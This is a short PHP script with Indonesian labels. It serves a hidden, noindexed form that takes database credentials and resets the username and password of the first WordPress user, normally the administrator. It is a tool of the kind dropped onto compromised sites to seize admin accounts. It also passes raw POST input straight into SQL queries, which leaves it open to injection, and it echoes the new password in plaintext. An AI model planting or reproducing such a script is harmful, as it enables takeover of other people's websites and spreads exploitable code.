<?php

if ($_POST) {
    $host = $_POST['host'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $db = $_POST['db'];
    $dbprefix = $_POST['dbprefix'];
    $user_baru = $_POST['user_baru'];
    $password_baru = $_POST['password_baru'];

    $table_users = $dbprefix . "users";

    $conn = mysqli_connect($host, $username, $password, $db);

    if (!$conn) {
        die("Koneksi database gagal: " . mysqli_connect_error());
    }

    // Ambil user pertama (biasanya admin)
    $sql = "SELECT ID FROM $table_users ORDER BY ID ASC LIMIT 1";
    $result = mysqli_query($conn, $sql);
    $row = mysqli_fetch_assoc($result);
    $id = $row['ID'];

    // Hash password baru pakai MD5 (seperti WordPress lama)
    $hashed_pass = md5($password_baru);

    // Update username & password
    $update = "UPDATE $table_users SET user_login='$user_baru', user_pass='$hashed_pass' WHERE ID='$id'";
    if (mysqli_query($conn, $update)) {
        echo "<b>User berhasil diperbarui!</b><br>";
        echo "Username baru: <b>$user_baru</b><br>";
        echo "Password baru: <b>$password_baru</b><br>";
    } else {
        echo "Gagal memperbarui user: " . mysqli_error($conn);
    }

    mysqli_close($conn);

} else {
    // Form input
    echo '
    <html>
    <head><meta content="robots" content="noindex,nofollow"></head>
    <body>
    <h2>Update User WordPress</h2>
    <form method="post">
        <input type="text" name="host" placeholder="localhost"><br>
        <input type="text" name="username" placeholder="User DB"><br>
        <input type="text" name="password" placeholder="Password DB"><br>
        <input type="text" name="db" placeholder="Database"><br>
        <input type="text" name="dbprefix" placeholder="dbprefix (misal: wp_)"><br>
        <input type="text" name="user_baru" placeholder="Username Baru"><br>
        <input type="text" name="password_baru" placeholder="Password Baru"><br>
        <input type="submit" value="Update User">
    </form>
    </body>
    </html>
    ';
}
?>
